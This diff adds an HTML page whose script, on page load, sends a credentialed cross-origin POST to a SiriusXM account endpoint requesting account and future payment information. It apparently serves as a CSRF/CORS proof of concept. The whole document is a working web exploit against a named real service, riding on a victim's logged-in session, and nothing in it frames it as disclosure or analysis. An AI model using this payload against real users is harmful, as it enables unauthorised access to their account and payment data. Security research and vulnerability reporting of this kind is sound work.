@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/care.siriusxm.com\/services\/account", true);
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        xhr.withCredentials = true;
+        xhr.send("{\"includeFuturePaymentInfo\": true,\"refreshAccount\": true}");
+      }
+      submitRequest();
+    </script>
+  </body>
+</html>
+      
+
